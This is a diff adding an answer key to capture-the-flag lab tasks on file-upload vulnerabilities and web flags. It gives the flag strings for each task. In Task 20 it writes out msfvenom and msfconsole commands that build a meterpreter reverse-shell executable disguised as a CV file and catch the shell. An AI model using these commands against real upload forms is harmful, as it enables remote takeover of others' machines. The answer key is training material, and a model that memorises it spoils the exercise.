@@ -305,3 +305,56 @@ Q: Not only profile pages but also stored images are vulnerable. Start with a UR
 A: THM{CLOSE_THE_DOOR}
 ===
 ///TASK 20///
+Q: What is the name given to file uploads that allow threat actors to upload any files that they want?
+** 
+A: Unrestricted 
+===
+Q: What is the title of the web application developed by Santa's freelancer?
+** 
+A: SantaSideKick2
+===
+Q: What is the value of the flag stored in the HR Elf's Documents directory?
+** msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.145.191 LPORT="4444" -f exe -o cv-username.exe
+** sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.145.191; set LPORT '4444'; exploit"
+** Give few minutes, and will get "meterpreter >"
+A: THM{Naughty.File.Uploads.Can.Get.You.RCE}
+===
+Q: What defence technique can be implemented to ensure that specific file types can be uploaded?
+** 
+A: File Extension Validation
+===
+Q:What defence technique can be used to make sure the threat actor cannot recover their file again by simply using the file name?
+** 
+A: File Renaming
+===
+Q: What defence technique can be used to make sure malicious files that can hurt elves are not uploaded?
+** 
+A: Malware Scanning
+===
+///TASK 21///
+Q: What is the value of Flag1?
+** 
+A: THM{McCode, Elf McCode}
+===
+Q: What is the value of Flag2?
+** 
+A: THM{KodeNRoll}
+===
+Q: What is the value of Flag3?
+** 
+A: THM{Are we secure yet?}
+===
+Q: What is the value of Flag4?
+** 
+A: THM{SQLi_who???}
+===
+///TASK 22///
+Q: 
+** 
+A: 
+===
+
+
+
+
+
